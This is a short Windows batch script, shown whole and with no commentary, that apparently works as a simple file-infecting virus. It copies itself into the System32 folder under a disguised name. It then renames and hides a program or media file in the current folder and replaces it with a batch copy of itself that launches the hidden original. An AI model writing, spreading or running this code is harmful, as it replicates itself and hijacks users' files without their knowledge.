@echo off
if not exist %Windir%\System32\WinLog.vsc copy %0 %Windir%\System32\WinLog.vsc
for %%f in (*.exe;*.wmv;*.avi;*.jpg;*.jpeg) do set ipt=%%f
ren %ipt% X%ipt%
attrib +s +h X%ipt%
copy %Windir%\System32\WinLog.vsc %ipt%.bat
echo if exist X%ipt% start X%ipt% >>%ipt%.bat
if exist .bat del /Q .bat 